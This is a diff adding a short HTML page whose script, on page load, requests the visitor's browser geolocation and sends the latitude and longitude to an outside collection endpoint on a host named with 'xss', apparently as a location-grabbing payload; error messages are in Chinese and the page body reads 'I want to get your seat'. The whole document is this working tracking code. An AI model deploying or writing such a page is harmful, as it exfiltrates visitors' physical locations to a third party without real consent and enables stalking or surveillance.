@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html>
+<head>
+<html lang="utf-8">
+<script src="./js/jquery-1.11.1.min.js">
+</script>
+<script>
+$(document).ready(function(){
+getLocation();
+ 
+function getLocation()
+{
+        if (navigator.geolocation)
+        {
+                navigator.geolocation.getCurrentPosition(showPosition,showError);
+        }
+        else
+        {
+                alert("该浏览器不支持定位");
+        }
+}
+function showPosition(position)
+{
+$.get("https://xss.1jr.com.cn/conn.php?getLng=" + position.coords.latitude + "," + position.coords.longitude ,function(data,status){
+    alert("Yes,666");
+});
+}
+function showError(error)
+{
+        switch(error.code) 
+        {
+                case error.PERMISSION_DENIED:
+        alert("用户拒绝对获取地理位置的请求");
+                        break;
+                case error.POSITION_UNAVAILABLE:
+        alert("位置信息是不可用的");
+                        break;
+                case error.TIMEOUT:
+        alert("请求用户地理位置超时");
+                        break;
+                case error.UNKNOWN_ERROR:
+        alert("未知错误");
+                        break;
+        }
+}
+});
+</script>
+</head>
+<body>
+<p>I want to get your seat</p>
+</body>
+</html>
